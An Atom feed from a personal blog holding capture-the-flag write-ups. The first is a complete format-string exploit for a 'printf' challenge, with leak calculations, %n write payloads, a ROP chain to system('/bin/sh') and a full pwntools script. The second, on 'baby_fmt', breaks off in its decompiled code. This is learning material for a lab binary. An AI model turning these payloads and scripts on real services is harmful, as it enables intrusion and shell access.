<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://psjsus4.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://psjsus4.github.io//" rel="alternate" type="text/html" /><updated>2025-05-07T22:34:47+00:00</updated><id>https://psjsus4.github.io//feed.xml</id><title type="html">Psjsus4 blog</title><subtitle>Here is a blog where I&apos;ll try to update my writeups, progress and notes on my cybersecurity journey.</subtitle><entry><title type="html">PrintF writeup</title><link href="https://psjsus4.github.io//bitsiege/ctf/2025/05/07/PrintF.html" rel="alternate" type="text/html" title="PrintF writeup" /><published>2025-05-07T22:22:22+00:00</published><updated>2025-05-07T22:22:22+00:00</updated><id>https://psjsus4.github.io//bitsiege/ctf/2025/05/07/PrintF</id><content type="html" xml:base="https://psjsus4.github.io//bitsiege/ctf/2025/05/07/PrintF.html"><![CDATA[<p>In this challenge, I exploit a <code class="language-plaintext highlighter-rouge">printf</code> vulnerability. The program leaks a stack address and I use it to calculate the location of <code class="language-plaintext highlighter-rouge">printf</code>â€™s return address on the stack. By overwriting its lsb, I force the program to return into and earlier part of <code class="language-plaintext highlighter-rouge">main</code> instead of exiting. Like that I gave me another round to exploit the <code class="language-plaintext highlighter-rouge">printf</code> vulnerability while having leaks for PIE and libc. Finally, I send a payload that replaces again the <code class="language-plaintext highlighter-rouge">printf</code> return address but this time with a ROP chain calling <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>.</p>

<h2 id="code">Code</h2>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">long</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">pBuf</span><span class="p">;</span>
    <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">var</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">520</span><span class="p">];</span>
    <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>

    <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
    <span class="n">var</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">pBuf</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mh">0x40</span><span class="p">;</span> <span class="n">i</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">pBuf</span><span class="p">(</span><span class="n">pcVar2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
        <span class="n">pcVar2</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Easy peasy printf, don't you think?"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"I feel generous so have this: %p</span><span class="err">
</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Show me you've got!"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">512</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Here we go!!"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
    <span class="cm">/* WARNING: Subroutine does not return */</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<hr />

<h2 id="1-initial-leak--offset-calculation">1. Initial Leak &amp; Offset Calculation</h2>

<ol>
  <li><strong>Leak the stack pointer</strong>: The program prints a stack address via <code class="language-plaintext highlighter-rouge">printf("...this: %p", &amp;var)</code>.</li>
  <li><strong>Find <code class="language-plaintext highlighter-rouge">printf_ret</code></strong>: In GDB, I saw that the saved <code class="language-plaintext highlighter-rouge">rsp</code> value when <code class="language-plaintext highlighter-rouge">printf</code> returns is at <code class="language-plaintext highlighter-rouge">stack_leak - 0x14</code></li>
</ol>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># In exploit():
</span><span class="n">recvu</span><span class="p">(</span><span class="sa">b</span><span class="s">"this: 0x"</span><span class="p">)</span>
<span class="n">stack_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">recvu</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">printf_ret</span>  <span class="o">=</span> <span class="n">stack_leak</span> <span class="o">-</span> <span class="mh">0x14</span>
</code></pre></div></div>

<hr />

<h2 id="2-first-format-string-payload-loop-back">2. First Format-String Payload (Loop Back)</h2>

<p>My goal is to overwrite the lsb of <code class="language-plaintext highlighter-rouge">printf_ret</code> so <code class="language-plaintext highlighter-rouge">printf</code> returns to an earlier part of <code class="language-plaintext highlighter-rouge">main</code>, letting me leak PIE and libc addresses and giving me the possibility to exploit the fsb again.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
    <span class="sa">b</span><span class="s">"dummy420"</span>      <span class="c1"># align the count
</span>  <span class="o">+</span> <span class="sa">b</span><span class="s">"||%79$p|"</span>      <span class="c1"># leak PIE
</span>  <span class="o">+</span> <span class="sa">b</span><span class="s">"||%75$p|"</span>      <span class="c1"># leak libc
</span>  <span class="o">+</span> <span class="sa">b</span><span class="s">"|%12$hhn"</span>      <span class="c1"># write 1 byte into printf_ret
</span>  <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">printf_ret</span><span class="p">)</span>
<span class="p">)</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">%12$hhn</code> writes the number of printed bytes so far into the <code class="language-plaintext highlighter-rouge">printf</code> RIP address.</li>
</ul>

<p>After this, the program loops and prints:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dummy420||0x&lt;pie_leak&gt;|||0x&lt;libc_leak&gt;|...
</code></pre></div></div>

<hr />

<h2 id="3-compute-pie--libc-bases">3. Compute PIE &amp; libc Bases</h2>

<ul>
  <li><strong>PIE base</strong> = <code class="language-plaintext highlighter-rouge">pie_leak - 0x1211</code></li>
  <li><strong>libc base</strong> = <code class="language-plaintext highlighter-rouge">libc_leak - 0x2A1CA</code></li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pie_base</span>     <span class="o">=</span> <span class="n">pie_leak</span>    <span class="o">-</span> <span class="mh">0x1211</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span>   <span class="o">-</span> <span class="mh">0x2A1CA</span>
</code></pre></div></div>

<hr />

<h2 id="4-second-payload-rop-chain">4. Second Payload: ROP Chain</h2>

<p>With base addresses known, I build a ROP chain:</p>

<ol>
  <li>
    <p><strong>Gadgets</strong>:</p>

    <ul>
      <li><code class="language-plaintext highlighter-rouge">pop rdi; ret</code> at <code class="language-plaintext highlighter-rouge">libc + 0x10f75b</code></li>
      <li><code class="language-plaintext highlighter-rouge">sleep; ret</code> at <code class="language-plaintext highlighter-rouge">libc + 0x4c161</code> (stack alignment)</li>
    </ul>
  </li>
  <li>
    <p><strong>Arguments</strong>:</p>

    <ul>
      <li>Address of <code class="language-plaintext highlighter-rouge">/bin/sh</code> in libc</li>
      <li><code class="language-plaintext highlighter-rouge">system</code> function address</li>
    </ul>
  </li>
</ol>

<p>I lay this out starting at <code class="language-plaintext highlighter-rouge">printf_ret</code>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x10f75b</span>
<span class="n">ret</span>   <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4c161</span>
<span class="n">binsh</span>   <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh"</span><span class="p">))</span>
<span class="n">system</span>  <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>

<span class="n">payload2</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span>
    <span class="mi">8</span><span class="p">,</span>
    <span class="p">{</span>
        <span class="n">printf_ret</span>        <span class="p">:</span> <span class="n">pop_rdi</span><span class="p">,</span>
        <span class="n">printf_ret</span> <span class="o">+</span> <span class="mh">0x8</span>  <span class="p">:</span> <span class="n">binsh</span><span class="p">,</span>
        <span class="n">printf_ret</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="p">:</span> <span class="n">ret</span><span class="p">,</span>
        <span class="n">printf_ret</span> <span class="o">+</span> <span class="mh">0x18</span> <span class="p">:</span> <span class="n">system</span><span class="p">,</span>
    <span class="p">}</span>
<span class="p">)</span>
</code></pre></div></div>

<p>When <code class="language-plaintext highlighter-rouge">printf</code> returns, it jumps into my ROP chain and runs <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>.</p>

<hr />

<h2 id="5-full-exploit-script">5. Full Exploit Script</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!python
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">pwn</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">getcwd</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>

<span class="n">speed</span> <span class="o">=</span> <span class="mi">0</span><span class="c1">#.5
</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./printf_patched"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
<span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ld-linux-x86-64.so.2"</span><span class="p">)</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">e</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">"kitty"</span><span class="p">,</span> <span class="s">"@"</span><span class="p">,</span> <span class="s">"new-window"</span><span class="p">,</span> <span class="s">"--cwd"</span><span class="p">,</span> <span class="n">getcwd</span><span class="p">()]</span>
<span class="n">context</span><span class="p">.</span><span class="n">gdbinit</span> <span class="o">=</span> <span class="s">"/etc/profiles/per-user/darktar/share/pwndbg/gdbinit.py"</span>

<span class="n">r</span><span class="p">:</span> <span class="n">process</span> <span class="o">=</span> <span class="bp">None</span>

<span class="n">u64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">d</span><span class="p">:</span> <span class="n">pwn</span><span class="p">.</span><span class="n">u64</span><span class="p">(</span><span class="n">d</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="p">)[:</span><span class="mi">8</span><span class="p">])</span>
<span class="n">u32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">d</span><span class="p">:</span> <span class="n">pwn</span><span class="p">.</span><span class="n">u32</span><span class="p">(</span><span class="n">d</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="p">)[:</span><span class="mi">4</span><span class="p">])</span>
<span class="n">u16</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">d</span><span class="p">:</span> <span class="n">pwn</span><span class="p">.</span><span class="n">u16</span><span class="p">(</span><span class="n">d</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="p">)[:</span><span class="mi">2</span><span class="p">])</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">:</span> <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">:</span> <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="p">(</span><span class="n">sleep</span><span class="p">(</span><span class="n">speed</span><span class="p">),</span> <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="p">(</span><span class="n">sleep</span><span class="p">(</span><span class="n">speed</span><span class="p">),</span> <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
<span class="n">recv</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="p">(</span><span class="n">sleep</span><span class="p">(</span><span class="n">speed</span><span class="p">),</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">())[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">recvn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="p">(</span><span class="n">sleep</span><span class="p">(</span><span class="n">speed</span><span class="p">),</span> <span class="n">r</span><span class="p">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">a</span><span class="p">))[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">recvu</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="o">=</span><span class="bp">True</span><span class="p">:</span> <span class="p">(</span><span class="n">sleep</span><span class="p">(</span><span class="n">speed</span><span class="p">),</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">))[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">clean</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">r</span><span class="p">.</span><span class="n">clean</span><span class="p">()</span>
<span class="n">success</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="n">fail</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="n">info</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
    b main
    continue
'''</span>

<span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">r</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"gdb"</span><span class="p">:</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">e</span><span class="p">.</span><span class="n">path</span><span class="p">],</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>



<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
    <span class="n">recvu</span><span class="p">(</span><span class="sa">b</span><span class="s">"this: 0x"</span><span class="p">)</span>
    <span class="n">stack_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">recvu</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
    <span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">))</span>
    <span class="n">printf_ret</span> <span class="o">=</span> <span class="n">stack_leak</span> <span class="o">-</span> <span class="mh">0x14</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"dummy420"</span><span class="o">+</span><span class="sa">b</span><span class="s">"||%79$p|"</span><span class="o">+</span><span class="sa">b</span><span class="s">"||%75$p|"</span><span class="o">+</span><span class="sa">b</span><span class="s">"|%12$hhn"</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">printf_ret</span><span class="p">)</span>
    <span class="n">info</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">recvu</span><span class="p">(</span><span class="sa">b</span><span class="s">"|0x"</span><span class="p">)</span>
    <span class="n">pie_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">recvu</span><span class="p">(</span><span class="sa">b</span><span class="s">"|"</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1211</span>
    <span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">pie_base</span><span class="p">))</span>
    <span class="n">recvu</span><span class="p">(</span><span class="sa">b</span><span class="s">"|0x"</span><span class="p">)</span>
    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">recvu</span><span class="p">(</span><span class="sa">b</span><span class="s">"|"</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x2A1CA</span>
    <span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
    <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x10f75b</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4c161</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span>
        <span class="p">{</span>
        <span class="n">printf_ret</span>      <span class="p">:</span> <span class="n">pop_rdi</span><span class="p">,</span>
        <span class="n">printf_ret</span><span class="o">+</span><span class="mh">0x8</span>  <span class="p">:</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)),</span>
        <span class="n">printf_ret</span><span class="o">+</span><span class="mh">0x10</span> <span class="p">:</span> <span class="n">ret</span><span class="p">,</span> <span class="c1">#fix misalignment
</span>        <span class="n">printf_ret</span><span class="o">+</span><span class="mh">0x18</span> <span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">],</span>
        <span class="p">}</span>
    <span class="p">)</span>
    <span class="n">recvu</span><span class="p">(</span><span class="sa">b</span><span class="s">"you've got!"</span><span class="p">)</span>
    <span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"good luck pwning :)"</span><span class="p">)</span>



<span class="n">conn</span><span class="p">()</span>
<span class="n">exploit</span><span class="p">()</span>

<span class="c1"># good luck pwning :)
</span><span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><em>good luck pwning :)</em></p>]]></content><author><name></name></author><category term="BitSiege" /><category term="CTF" /><summary type="html"><![CDATA[In this challenge, I exploit a printf vulnerability. The program leaks a stack address and I use it to calculate the location of printfâ€™s return address on the stack. By overwriting its lsb, I force the program to return into and earlier part of main instead of exiting. Like that I gave me another round to exploit the printf vulnerability while having leaks for PIE and libc. Finally, I send a payload that replaces again the printf return address but this time with a ROP chain calling system("/bin/sh").]]></summary></entry><entry><title type="html">Babyâ€™s First Format writeup</title><link href="https://psjsus4.github.io//bitsiege/ctf/2025/05/07/babyfmt.html" rel="alternate" type="text/html" title="Babyâ€™s First Format writeup" /><published>2025-05-07T22:22:22+00:00</published><updated>2025-05-07T22:22:22+00:00</updated><id>https://psjsus4.github.io//bitsiege/ctf/2025/05/07/babyfmt</id><content type="html" xml:base="https://psjsus4.github.io//bitsiege/ctf/2025/05/07/babyfmt.html"><![CDATA[<p>We are given a 64-bit ELF binary (<code class="language-plaintext highlighter-rouge">baby_fmt</code>) that reads a string from the user, applies a custom encoder and then prints it out via <code class="language-plaintext highlighter-rouge">printf()</code> if the input contains <code class="language-plaintext highlighter-rouge">"funny"</code>. But since the output is not formatted itâ€™s vulnerable to the fsb. I exploited it by overwriting the got of <code class="language-plaintext highlighter-rouge">__stack_chk_fail</code> with a hidden function that calls <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>:</p>

<h2 id="baby_fmt-code">baby_fmt code</h2>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">win</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">stuff</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">char</span> <span class="n">var</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">i</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="sc">'a'</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="sc">'z'</span> <span class="o">&lt;</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">((</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="sc">'0'</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="sc">'9'</span> <span class="o">&lt;</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">((</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="sc">'A'</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="sc">'Z'</span> <span class="o">&lt;</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">((</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'%'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'$'</span><span class="p">))</span>
                        <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">var</span> <span class="o">+</span> <span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">i</span><span class="o">/</span><span class="mi">7</span><span class="p">)</span><span class="o">*-</span><span class="mi">7</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">&lt;</span> <span class="sc">L':'</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">var</span> <span class="o">+</span> <span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">i</span><span class="o">/</span><span class="mi">7</span><span class="p">)</span><span class="o">*-</span><span class="mi">7</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">var</span> <span class="o">+</span> <span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">i</span><span class="o">/</span><span class="mi">7</span><span class="p">)</span><span class="o">*-</span><span class="mi">7</span> <span class="o">+</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="o">-</span><span class="mi">10</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">&lt;</span> <span class="sc">L'{'</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">var</span> <span class="o">+</span> <span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">i</span><span class="o">/</span><span class="mi">7</span><span class="p">)</span><span class="o">*-</span><span class="mi">7</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">var</span> <span class="o">+</span> <span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">i</span><span class="o">/</span><span class="mi">7</span><span class="p">)</span><span class="o">*-</span><span class="mi">7</span> <span class="o">+</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="o">-</span><span class="mi">26</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">long</span> <span class="n">funny</span><span class="p">;</span>
    <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
